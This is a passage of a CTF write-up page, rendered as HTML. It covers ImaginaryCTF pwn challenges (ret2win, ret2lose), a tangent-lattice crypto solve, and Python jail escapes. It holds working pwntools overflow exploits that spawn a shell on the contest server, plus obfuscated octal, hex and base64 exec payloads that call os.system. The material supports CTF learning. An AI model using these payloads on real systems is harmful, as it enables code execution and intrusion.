<a id=__codelineno-8-12 name=__codelineno-8-12 href=#__codelineno-8-12></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x000000000040101a</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span>
<a id=__codelineno-8-13 name=__codelineno-8-13 href=#__codelineno-8-13></a>
<a id=__codelineno-8-14 name=__codelineno-8-14 href=#__codelineno-8-14></a><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <h4 id=ret2lose>Ret2lose</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a>Description
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a>You overflowed the buffer and got the flag... but can you get my other flag? (Remote and binary are the same as in the challenge ret2win, but you have to get a shell this time)
</code></pre></div> <p>This challenge has the exact same binary as the above challenge but in this time we have to get remote shell.</p> <p>On the first glance this looks like a simple ret2libc challenge in which we can leak the libc address using the GOT entries but its not so simple. If we try to find the ROPgadgets in the binary we find that the pop rdi ; ret gadget in missing. This we cannot get a libc leak directly.</p> <p><strong>Exploitation Vector</strong></p> <p>While messing around which the challenge binary I found that if we call the gets function, it stores the input somewhere in the libc. Interestingly this input is also present in the rdi register and thus we can control the rdi register.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./vuln&quot;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a><span class=n>p</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
<a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a><span class=c1># p = remote(b&quot;ret2win.chal.imaginaryctf.org&quot;, 1337)</span>
<a id=__codelineno-10-6 name=__codelineno-10-6 href=#__codelineno-10-6></a>
<a id=__codelineno-10-7 name=__codelineno-10-7 href=#__codelineno-10-7></a><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=s1>&#39;&#39;&#39;</span>
<a id=__codelineno-10-8 name=__codelineno-10-8 href=#__codelineno-10-8></a><span class=s1>    init-gef</span>
<a id=__codelineno-10-9 name=__codelineno-10-9 href=#__codelineno-10-9></a><span class=s1>    c  </span>
<a id=__codelineno-10-10 name=__codelineno-10-10 href=#__codelineno-10-10></a><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
<a id=__codelineno-10-11 name=__codelineno-10-11 href=#__codelineno-10-11></a>
<a id=__codelineno-10-12 name=__codelineno-10-12 href=#__codelineno-10-12></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>gets</span><span class=p>)</span>
<a id=__codelineno-10-13 name=__codelineno-10-13 href=#__codelineno-10-13></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<a id=__codelineno-10-14 name=__codelineno-10-14 href=#__codelineno-10-14></a>
<a id=__codelineno-10-15 name=__codelineno-10-15 href=#__codelineno-10-15></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;b&quot;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
<a id=__codelineno-10-16 name=__codelineno-10-16 href=#__codelineno-10-16></a>
<a id=__codelineno-10-17 name=__codelineno-10-17 href=#__codelineno-10-17></a><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a>───────────────────────────────────────────────────────────────── registers ────
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>$rax   : 0x007f1646c1ba80  →  &quot;bbbbabbb&quot;
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a>$rbx   : 0x0               
<a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a>$rcx   : 0x007f1646c19aa0  →  0x00000000fbad2088
<a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a>$rdx   : 0x62626261        
<a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a>$rsp   : 0x007fff6410dda8  →  0x00000000401156  →  &lt;main+0&gt; endbr64 
<a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a>$rbp   : 0x6161616161616161 (&quot;aaaaaaaa&quot;?)
<a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a>$rsi   : 0x62626262        
<a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a>$rdi   : 0x007f1646c1ba80  →  &quot;bbbbabbb&quot;
<a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a>$rip   : 0x0               
<a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a>$r8    : 0x0               
<a id=__codelineno-11-12 name=__codelineno-11-12 href=#__codelineno-11-12></a>$r9    : 0x0               
<a id=__codelineno-11-13 name=__codelineno-11-13 href=#__codelineno-11-13></a>$r10   : 0x77              
<a id=__codelineno-11-14 name=__codelineno-11-14 href=#__codelineno-11-14></a>$r11   : 0x246             
<a id=__codelineno-11-15 name=__codelineno-11-15 href=#__codelineno-11-15></a>$r12   : 0x007fff6410dea8  →  0x007fff6410f188  →  &quot;/media/sf_E_DRIVE/CTFs/ImaginaryCTF23/ret2lose/vul[...]&quot;
<a id=__codelineno-11-16 name=__codelineno-11-16 href=#__codelineno-11-16></a>$r13   : 0x00000000401156  →  &lt;main+0&gt; endbr64 
<a id=__codelineno-11-17 name=__codelineno-11-17 href=#__codelineno-11-17></a>$r14   : 0x00000000403e18  →  0x00000000401120  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
<a id=__codelineno-11-18 name=__codelineno-11-18 href=#__codelineno-11-18></a>$r15   : 0x007f1646d5b040  →  0x007f1646d5c2e0  →  0x0000000000000000
<a id=__codelineno-11-19 name=__codelineno-11-19 href=#__codelineno-11-19></a>$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
<a id=__codelineno-11-20 name=__codelineno-11-20 href=#__codelineno-11-20></a>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
</code></pre></div> <p>Here as we can see the 5th character is one smaller than the sent input. I assume that it might be due to some flag variable present. Now that we have rdi control we can just call system with /bin/sh as argument in the rdi register.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a>
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./vuln&quot;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a><span class=n>p</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
<a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;ret2win.chal.imaginaryctf.org&quot;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
<a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a>
<a id=__codelineno-12-7 name=__codelineno-12-7 href=#__codelineno-12-7></a><span class=c1># gdb.attach(p,&#39;&#39;&#39;</span>
<a id=__codelineno-12-8 name=__codelineno-12-8 href=#__codelineno-12-8></a><span class=c1>#     init-gef</span>
<a id=__codelineno-12-9 name=__codelineno-12-9 href=#__codelineno-12-9></a><span class=c1>#     b *0x0000000000401050</span>
<a id=__codelineno-12-10 name=__codelineno-12-10 href=#__codelineno-12-10></a><span class=c1>#     c  </span>
<a id=__codelineno-12-11 name=__codelineno-12-11 href=#__codelineno-12-11></a><span class=c1># &#39;&#39;&#39;)</span>
<a id=__codelineno-12-12 name=__codelineno-12-12 href=#__codelineno-12-12></a>
<a id=__codelineno-12-13 name=__codelineno-12-13 href=#__codelineno-12-13></a><span class=c1># print(elf.sym)</span>
<a id=__codelineno-12-14 name=__codelineno-12-14 href=#__codelineno-12-14></a>
<a id=__codelineno-12-15 name=__codelineno-12-15 href=#__codelineno-12-15></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>gets</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>system</span><span class=p>)</span>
<a id=__codelineno-12-16 name=__codelineno-12-16 href=#__codelineno-12-16></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<a id=__codelineno-12-17 name=__codelineno-12-17 href=#__codelineno-12-17></a>
<a id=__codelineno-12-18 name=__codelineno-12-18 href=#__codelineno-12-18></a><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&quot;/bin0sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-12-19 name=__codelineno-12-19 href=#__codelineno-12-19></a>
<a id=__codelineno-12-20 name=__codelineno-12-20 href=#__codelineno-12-20></a><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a>[+] Opening connection to b&#39;ret2win.chal.imaginaryctf.org&#39; on port 1337: Done
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a>[*] Switching to interactive mode
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a>== proof-of-work: disabled ==
<a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a>$ ls
<a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a>chal
<a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a>flag.txt
<a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a>the_other_flag_that_you_must_get_a_shell_to_find_8e46414287280e86e0576f0525b7ead0c0780c91.txt
<a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a>$ cat the_other_flag_that_you_must_get_a_shell_to_find_8e46414287280e86e0576f0525b7ead0c0780c91.txt
<a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a>ictf{ret2libc?_what_libc?}
</code></pre></div> <h4 id=tan>TAN</h4> <p><code>tan.sage</code> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a>print(tan(int.from_bytes(open(&quot;flag.txt&quot;, &quot;rb&quot;).read().strip(), &quot;big&quot;)).n(1024))
<a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a># -0.7578486465144361653056740883647981074157721568235263947812770328593706155446273431983003083023944193451634501133844062222318380912228469321984711771640337084400211818130699382144693337133198331117688092846455855532799303682791981067718891947573941091671581719597626862194794682042719495503282817868258547714
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a><span class=n>RR</span> <span class=o>=</span> <span class=n>RealField</span><span class=p>(</span><span class=mi>4000</span><span class=p>)</span>
<a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>
<a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a><span class=n>x</span> <span class=o>=</span> <span class=n>RR</span><span class=p>(</span><span class=s2>&quot;-0.7578486465...&quot;</span><span class=p>)</span>
<a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a><span class=n>ax</span> <span class=o>=</span> <span class=n>atan</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
<a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a><span class=n>rpi</span> <span class=o>=</span> <span class=n>RR</span><span class=p>(</span><span class=n>pi</span><span class=p>)</span>
<a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a><span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=p>[[(</span><span class=n>ax</span> <span class=o>*</span> <span class=mi>2</span><span class=o>**</span><span class=mi>600</span><span class=p>)</span><span class=o>.</span><span class=n>round</span><span class=p>(),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>320</span><span class=p>],</span>
<a id=__codelineno-15-7 name=__codelineno-15-7 href=#__codelineno-15-7></a>    <span class=p>[</span>      <span class=o>-</span><span class=mi>2</span><span class=o>**</span><span class=mi>600</span><span class=p>,</span>   <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span> <span class=p>],</span> <span class=p>[(</span><span class=n>rpi</span> <span class=o>*</span> <span class=mi>2</span><span class=o>**</span><span class=mi>600</span><span class=p>)</span><span class=o>.</span><span class=n>round</span><span class=p>(),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
<a id=__codelineno-15-8 name=__codelineno-15-8 href=#__codelineno-15-8></a><span class=p>])</span>
<a id=__codelineno-15-9 name=__codelineno-15-9 href=#__codelineno-15-9></a><span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=n>M</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span><span class=o>.</span><span class=n>rows</span><span class=p>():</span>
<a id=__codelineno-15-10 name=__codelineno-15-10 href=#__codelineno-15-10></a>    <span class=k>if</span> <span class=n>r</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span> <span class=nb>print</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>*</span> <span class=n>M</span><span class=p>[</span><span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>]</span> <span class=o>//</span> <span class=n>r</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>64</span><span class=p>,</span> <span class=s2>&quot;big&quot;</span><span class=p>))</span>
</code></pre></div> <h4 id=perfect-picture>Perfect Picture</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span><span class=p>,</span>  <span class=n>ExifTags</span>
<a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a><span class=kn>from</span> <span class=nn>PIL.PngImagePlugin</span> <span class=kn>import</span> <span class=n>PngInfo</span>
<a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a>
<a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a><span class=n>img</span><span class=o>=</span><span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&quot;RGBA&quot;</span><span class=p>,(</span><span class=mi>690</span><span class=p>,</span><span class=mi>420</span><span class=p>),</span><span class=n>color</span><span class=o>=</span><span class=s2>&quot;#000000&quot;</span><span class=p>)</span>
<a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a><span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=mi>412</span><span class=p>,</span> <span class=mi>309</span><span class=p>),</span> <span class=p>(</span><span class=mi>52</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>123</span><span class=p>))</span>
<a id=__codelineno-16-6 name=__codelineno-16-6 href=#__codelineno-16-6></a><span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=mi>12</span><span class=p>,</span> <span class=mi>209</span><span class=p>),</span> <span class=p>(</span><span class=mi>42</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>125</span><span class=p>,</span> <span class=mi>231</span><span class=p>))</span>
<a id=__codelineno-16-7 name=__codelineno-16-7 href=#__codelineno-16-7></a><span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=mi>264</span><span class=p>,</span> <span class=mi>143</span><span class=p>),</span> <span class=p>(</span><span class=mi>122</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>213</span><span class=p>))</span>
<a id=__codelineno-16-8 name=__codelineno-16-8 href=#__codelineno-16-8></a>
<a id=__codelineno-16-9 name=__codelineno-16-9 href=#__codelineno-16-9></a><span class=n>metadata</span> <span class=o>=</span> <span class=n>PngInfo</span><span class=p>()</span>
<a id=__codelineno-16-10 name=__codelineno-16-10 href=#__codelineno-16-10></a><span class=n>metadata</span><span class=o>.</span><span class=n>add_text</span><span class=p>(</span><span class=s2>&quot;Description&quot;</span><span class=p>,</span> <span class=s2>&quot;jctf</span><span class=si>{not_the_flag}</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-16-11 name=__codelineno-16-11 href=#__codelineno-16-11></a><span class=n>metadata</span><span class=o>.</span><span class=n>add_text</span><span class=p>(</span><span class=s2>&quot;Title&quot;</span><span class=p>,</span> <span class=s2>&quot;kool_pic&quot;</span><span class=p>)</span>
<a id=__codelineno-16-12 name=__codelineno-16-12 href=#__codelineno-16-12></a><span class=n>metadata</span><span class=o>.</span><span class=n>add_text</span><span class=p>(</span><span class=s2>&quot;Author&quot;</span><span class=p>,</span> <span class=s2>&quot;anon&quot;</span><span class=p>)</span>
<a id=__codelineno-16-13 name=__codelineno-16-13 href=#__codelineno-16-13></a>
<a id=__codelineno-16-14 name=__codelineno-16-14 href=#__codelineno-16-14></a><span class=n>img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&quot;d.png&quot;</span><span class=p>,</span> <span class=n>pnginfo</span><span class=o>=</span><span class=n>metadata</span><span class=p>)</span>
</code></pre></div> <h4 id=dantectf-helljail-tfcctf-my-first-calculator>DanteCTF-HellJail TFCCTF-MY FIRST CALCULATOR</h4> <p><strong>HellJail</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=ch>#!/usr/bin/env python3</span>
<a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a>
<a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>ascii_letters</span>
<a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a>
<a id=__codelineno-17-5 name=__codelineno-17-5 href=#__codelineno-17-5></a><span class=n>code</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
<a id=__codelineno-17-6 name=__codelineno-17-6 href=#__codelineno-17-6></a>
<a id=__codelineno-17-7 name=__codelineno-17-7 href=#__codelineno-17-7></a><span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>c</span> <span class=ow>in</span> <span class=n>ascii_letters</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>code</span><span class=p>):</span>
<a id=__codelineno-17-8 name=__codelineno-17-8 href=#__codelineno-17-8></a>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;You will never leave this place!&#39;</span><span class=p>)</span>
<a id=__codelineno-17-9 name=__codelineno-17-9 href=#__codelineno-17-9></a><span class=k>elif</span> <span class=nb>any</span><span class=p>(</span><span class=n>c</span> <span class=ow>in</span> <span class=s1>&#39;.:;,-_@&quot;=/%</span><span class=se>\\</span><span class=s1>&#39;</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>code</span><span class=p>):</span>
<a id=__codelineno-17-10 name=__codelineno-17-10 href=#__codelineno-17-10></a>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;You will never reach this point, but still, you CANNOT leave!&#39;</span><span class=p>)</span>
<a id=__codelineno-17-11 name=__codelineno-17-11 href=#__codelineno-17-11></a><span class=k>else</span><span class=p>:</span>
<a id=__codelineno-17-12 name=__codelineno-17-12 href=#__codelineno-17-12></a>    <span class=n>exec</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a><span class=c1># from the writeups - @AbuQasem</span>
<a id=__codelineno-18-2 name=__codelineno-18-2 href=#__codelineno-18-2></a><span class=kn>import</span> <span class=nn>string</span><span class=o>,</span><span class=nn>sys</span>
<a id=__codelineno-18-3 name=__codelineno-18-3 href=#__codelineno-18-3></a>
<a id=__codelineno-18-4 name=__codelineno-18-4 href=#__codelineno-18-4></a><span class=n>fake_alphabet</span> <span class=o>=</span> <span class=s2>&quot;𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷&quot;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&quot; &quot;</span><span class=p>)</span>
<a id=__codelineno-18-5 name=__codelineno-18-5 href=#__codelineno-18-5></a><span class=n>real_alphabet</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span>
<a id=__codelineno-18-6 name=__codelineno-18-6 href=#__codelineno-18-6></a><span class=n>trans</span> <span class=o>=</span> <span class=nb>str</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=s2>&quot;&quot;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>real_alphabet</span><span class=p>),</span> <span class=s2>&quot;&quot;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>fake_alphabet</span><span class=p>))</span>
<a id=__codelineno-18-7 name=__codelineno-18-7 href=#__codelineno-18-7></a>
<a id=__codelineno-18-8 name=__codelineno-18-8 href=#__codelineno-18-8></a><span class=n>code</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
<a id=__codelineno-18-9 name=__codelineno-18-9 href=#__codelineno-18-9></a><span class=n>converted_code</span> <span class=o>=</span> <span class=n>code</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=n>trans</span><span class=p>)</span>
<a id=__codelineno-18-10 name=__codelineno-18-10 href=#__codelineno-18-10></a>
<a id=__codelineno-18-11 name=__codelineno-18-11 href=#__codelineno-18-11></a><span class=nb>print</span><span class=p>(</span><span class=n>converted_code</span><span class=p>)</span>
<a id=__codelineno-18-12 name=__codelineno-18-12 href=#__codelineno-18-12></a>
<a id=__codelineno-18-13 name=__codelineno-18-13 href=#__codelineno-18-13></a><span class=c1># python3 exploit.py &quot;eval(input(&#39;x &#39;))&quot;</span>
<a id=__codelineno-18-14 name=__codelineno-18-14 href=#__codelineno-18-14></a><span class=c1># __import__(&#39;os&#39;).system(&#39;sh&#39;)</span>
<a id=__codelineno-18-15 name=__codelineno-18-15 href=#__codelineno-18-15></a><span class=c1># cat flag.txt</span>
</code></pre></div> <p><strong>MY FIRST CALCULATOR</strong></p> <p>字符串转八进制 <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=k>class</span> <span class=nc>OctUTF8</span><span class=p>:</span>
<a id=__codelineno-19-2 name=__codelineno-19-2 href=#__codelineno-19-2></a>  <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span><span class=n>s</span><span class=p>):</span>
<a id=__codelineno-19-3 name=__codelineno-19-3 href=#__codelineno-19-3></a>    <span class=bp>self</span><span class=o>.</span><span class=n>s</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
<a id=__codelineno-19-4 name=__codelineno-19-4 href=#__codelineno-19-4></a>  <span class=k>def</span> <span class=fm>__repr__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
<a id=__codelineno-19-5 name=__codelineno-19-5 href=#__codelineno-19-5></a>    <span class=k>return</span> <span class=s2>&quot;b&#39;&quot;</span> <span class=o>+</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=se>\\</span><span class=si>{</span><span class=n>n</span><span class=si>:</span><span class=s1>03o</span><span class=si>}</span><span class=s1>&#39;</span> <span class=k>for</span> <span class=n>n</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&quot;&#39;&quot;</span>
</code></pre></div></p> <p>执行 <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a>#Octal
<a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a>exec(&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;)
<a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a>#Hex
<a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a>exec(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;)
<a id=__codelineno-20-5 name=__codelineno-20-5 href=#__codelineno-20-5></a>#Base64
<a id=__codelineno-20-6 name=__codelineno-20-6 href=#__codelineno-20-6></a>exec(&#39;X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=&#39;.decode(&quot;base64&quot;)) #Only python2
<a id=__codelineno-20-7 name=__codelineno-20-7 href=#__codelineno-20-7></a>exec(__import__(&#39;base64&#39;).b64decode(&#39;X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=&#39;))
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a>python exploit.py <span class=s2>&quot;exec(&#39;\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\143\141\164\040\146\154\141\147\047\051&#39;)&quot;</span>
<a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>𝔢𝔵𝔢𝔠<span class=o>(</span><span class=s1>&#39;\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\143\141\164\040\146\154\141\147\047\051&#39;</span><span class=o>)</span>
